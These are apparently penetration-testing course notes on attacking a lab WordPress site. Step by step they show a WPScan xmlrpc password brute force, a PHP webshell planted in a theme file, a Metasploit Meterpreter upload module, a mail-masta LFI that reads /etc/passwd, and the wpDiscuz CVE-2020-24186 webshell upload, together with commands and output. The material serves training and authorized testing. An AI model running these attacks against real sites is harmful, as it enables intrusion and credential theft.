## Overview

- Starting point: WordPress confirmed, version + plugins already enumerated (previous section).
- Two combined techniques covered:
  1. **Login brute force** → get valid admin creds.
  2. **RCE via Theme Editor** → use those creds to get code execution.
- They **build on each other**: need admin-level creds first to reach the theme editor.

## Login Brute Force — WPScan

- Known users from prior enumeration: `admin`, `john`.
- WPScan supports two brute-force methods:
  - **`wp-login`** — standard login page.
  - **`xmlrpc`** — via WordPress API (`/xmlrpc.php`) — **faster, preferred**.

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

```
[SUCCESS] - john / firebird1
[!] Valid Combinations Found:
 | Username: john, Password: firebird1
```

- `--password-attack` → attack type; `-U` → username(s)/file; `-P` → password list; `-t` → threads.
- Result: valid creds **john:firebird1**.

## Code Execution — Theme Editor

### Manual Method

1. Log in to `/wp-login.php` with `john:firebird1` → redirected to admin panel.
2. **Appearance → Theme Editor**.
3. Select an **inactive** theme (don't touch the live one) — e.g., **Twenty Nineteen** (active theme was Transport Gravity).
4. Edit an uncommon page, e.g. `404.php`, and insert:
   ```php
   system($_GET[0]);
   ```
   — placed just below the comments to minimize visible modification.
5. **Update File** to save.

### Access the Webshell

- Theme files live at `/wp-content/themes/<theme name>/`.

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- From here: pivot to an interactive reverse shell and continue host enumeration.

### Automated Method — Metasploit `wp_admin_shell_upload`

- Uploads a **malicious plugin** → executes a **PHP Meterpreter** payload.

```
use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
```

- **Important:** in environments using Vhosts, must set **both** `RHOSTS` and `VHOST`, or the module fails with `"The target does not appear to be using WordPress."`

### Cleanup & Reporting Discipline

- Tools like this Metasploit module **attempt self-cleanup**, but sometimes fail (an uploaded artifact could remain).
- **Always attempt manual cleanup** of artifacts (uploaded shells, plugins, etc.) regardless of tool auto-cleanup.
- **Report appendices should document:**
  - Exploited systems (hostname/IP + exploitation method)
  - Compromised users (account name, compromise method, account type — local/domain)
  - Artifacts created on systems
  - Changes made (e.g., new local admin user, group membership changes)

## Leveraging Known Plugin/Theme Vulnerabilities

- Per WPScan's vulnerability database (23,595 total at time of writing):
  - **4%** WordPress core
  - **89%** plugins
  - **7%** themes
- Vulnerability count has grown steadily since 2014 — driven by the sheer volume of themes/plugins.
- **Lesson:** be extremely thorough — forgotten/unused plugins may still be present and exploitable even if no longer "in use" on the site.
- **Tip:** use **waybackurls** (Wayback Machine) to find older site versions — may reveal plugins that were since removed from visible use but whose files/directories are still accessible.

### Example 1 — mail-masta (Unauthenticated LFI + SQLi, since 2016)

**Vulnerable code:**
```php
<?php
include($_GET['pl']);
global $wpdb;
$camp_id = $_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count = $wpdb->get_results("SELECT count(*) co from $masta_reports where camp_id=$camp_id and status=1");
echo $count[0]->co;
?>
```

- `pl` GET parameter passed straight into `include()` — **no validation/sanitization** → arbitrary **Local File Inclusion**.
- `camp_id` POST parameter also concatenated directly into a SQL query → **SQL injection**.

**Exploit (LFI → read /etc/passwd):**

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
...
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

### Example 2 — wpDiscuz 7.0.4 (Unauthenticated RCE via File Upload Bypass)

- Extremely popular plugin (1.6M+ downloads, 90,000+ active installs) — good odds of encountering it.
- **CVE-2020-24186** — MIME-type validation bypass allows uploading a **malicious PHP file** disguised as an image attachment.

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

```
[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg
[+] Upload Success... Webshell path: .../wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php
> id
[x] Failed to execute PHP code...
```

- Script's own RCE check may fail, but the shell often still works — invoke manually via `?cmd=`:

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- **Cleanup reminder:** remove the uploaded shell file and document it as a testing artifact in the report.

## Key Takeaways

| Technique | Requirement | Outcome |
|---|---|---|
| WPScan xmlrpc brute force | Known valid username(s) | Cleartext password |
| Theme Editor RCE (manual or Metasploit) | Valid **admin-level** credentials | Webshell / Meterpreter as `www-data` |
| mail-masta exploit | Plugin present, regardless of "in use" status | LFI / SQLi, no auth needed |
| wpDiscuz exploit | Plugin present + a valid post page | Unauthenticated RCE via file upload bypass |

- **xmlrpc-based brute force is faster** than standard wp-login brute forcing — prefer it when available.
- Theme Editor access = near-guaranteed RCE once you have admin creds — always edit an **inactive** theme to avoid breaking the live site.
- The overwhelming majority of WordPress vulnerabilities live in **plugins**, not core — thorough plugin enumeration (including old/forgotten ones) is the highest-value enumeration activity.
- Always practice **cleanup discipline** and document every artifact/change for the final report, regardless of whether automated tools claim to clean up after themselves.
